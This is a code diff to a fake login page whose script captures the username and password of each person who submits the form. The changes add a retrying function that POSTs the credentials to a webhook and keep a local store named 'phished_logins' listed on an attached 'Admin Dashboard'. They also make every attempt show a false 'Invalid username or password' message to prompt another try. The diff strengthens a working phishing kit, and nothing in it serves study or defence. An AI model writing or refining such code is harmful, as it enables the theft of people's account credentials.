@@ -22,8 +22,6 @@
     border-width: 0 2px 2px 0; transform: rotate(45deg);
   }
   input[type="checkbox"]:focus { outline: none; box-shadow: 0 0 0 2px rgba(0,176,255,0.3); }
-
-  /* Login Button Styling */
   #loginBtn { 
     transition: bottom 0.3s ease; 
     min-width: 40%; 
@@ -33,7 +31,6 @@
     display: block; 
     margin: 0 auto; 
   }
-
   .input-container { width: 85%; margin: 0 auto; }
   input[type="text"], input[type="password"] { width: 100%; font-size: 0.95rem; padding-bottom: 0.25rem; }
   label[for="password"] { position: relative; top: -3px; font-size: 0.75rem; }
@@ -53,7 +50,6 @@
 </style>
 </head>
 <body class="bg-white min-h-screen flex flex-col justify-between max-w-lg mx-auto relative">
-
 <div id="loginSection" class="pt-4 px-6 relative flex flex-col flex-grow">
   <button aria-label="Back" class="absolute top-4 left-6 text-[#00b5e7] leading-none font-medium back-arrow" onclick="goBack()">
     <i class="fas fa-chevron-left"></i>
@@ -80,7 +76,6 @@
     <button id="loginBtn" type="submit" class="bg-gray-400 text-white font-medium text-lg py-3 rounded-full mt-4" disabled>Log In</button>
   </form>
 </div>
-
 <div id="adminSection" class="p-6 max-w-3xl mx-auto">
   <h1 class="text-3xl font-bold text-gray-900 mb-6">Admin Dashboard</h1>
   <div class="card p-6 mb-6">
@@ -101,7 +96,6 @@
     </div>
   </div>
 </div>
-
 <script>
 document.addEventListener("DOMContentLoaded", function() {
   const usernameInput = document.getElementById("username");
@@ -113,10 +107,11 @@ document.addEventListener("DOMContentLoaded", function() {
   const totalLogins = document.getElementById("totalLogins");
   const lastLogin = document.getElementById("lastLogin");
 
-  const WEBHOOK_URL = "YOUR_TEST_WEBHOOK_URL"; // Replace with your test webhook URL for educational use
+  const WEBHOOK_URL = "YOUR_TEST_WEBHOOK_URL"; // Replace with your actual test webhook URL
+  const MAX_RETRIES = 3;
 
   let loginCount = 0;
-  let capturedLogins = [];
+  let capturedLogins = JSON.parse(localStorage.getItem("phished_logins") || "[]");
 
   function checkInputs() {
     if (usernameInput.value.trim() && passwordInput.value.trim()) {
@@ -133,6 +128,7 @@ document.addEventListener("DOMContentLoaded", function() {
   function updateAdminDashboard(username, timestamp) {
     loginCount++;
     capturedLogins.push({ username, timestamp });
+    localStorage.setItem("phished_logins", JSON.stringify(capturedLogins));
     totalLogins.textContent = loginCount;
     lastLogin.textContent = timestamp;
 
@@ -151,6 +147,7 @@ document.addEventListener("DOMContentLoaded", function() {
     capturedLogins = capturedLogins.filter(
       (login) => login.username !== username || login.timestamp !== timestamp
     );
+    localStorage.setItem("phished_logins", JSON.stringify(capturedLogins));
     loginCount--;
     totalLogins.textContent = loginCount;
     if (capturedLogins.length > 0) {
@@ -161,34 +158,47 @@ document.addEventListener("DOMContentLoaded", function() {
     element.parentElement.remove();
   };
 
+  async function sendToWebhook(payload, retries = MAX_RETRIES) {
+    try {
+      const response = await fetch(WEBHOOK_URL, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify(payload),
+        mode: "cors"
+      });
+      if (!response.ok) throw new Error("Webhook request failed");
+      return true;
+    } catch {
+      if (retries > 0) {
+        return await sendToWebhook(payload, retries - 1);
+      }
+      return false;
+    }
+  }
+
   usernameInput.addEventListener("input", checkInputs);
   passwordInput.addEventListener("input", checkInputs);
 
-  loginForm.addEventListener("submit", function(e) {
+  loginForm.addEventListener("submit", async function(e) {
     e.preventDefault();
     const username = usernameInput.value.trim();
     const password = passwordInput.value.trim();
     const timestamp = new Date().toLocaleString();
 
     if (username && password) {
-      // Send data to webhook
-      fetch(WEBHOOK_URL, {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ username, password, timestamp })
-      })
-        .then(() => {
-          updateAdminDashboard(username, timestamp);
-          errorMsg.classList.remove("hidden");
-          usernameInput.value = "";
-          passwordInput.value = "";
-          checkInputs();
-        })
-        .catch((error) => {
-          console.error("Error sending to webhook:", error);
-          errorMsg.textContent = "Error submitting data. Try again.";
-          errorMsg.classList.remove("hidden");
-        });
+      const payload = { username, password, timestamp };
+      const success = await sendToWebhook(payload);
+      capturedLogins.push(payload);
+      localStorage.setItem("phished_logins", JSON.stringify(capturedLogins));
+      updateAdminDashboard(username, timestamp);
+      errorMsg.textContent = "Invalid username or password. Try again.";
+      errorMsg.classList.remove("hidden");
+      usernameInput.value = "";
+      passwordInput.value = "";
+      checkInputs();
+    } else {
+      errorMsg.textContent = "Please fill in both fields.";
+      errorMsg.classList.remove("hidden");
     }
   });
 
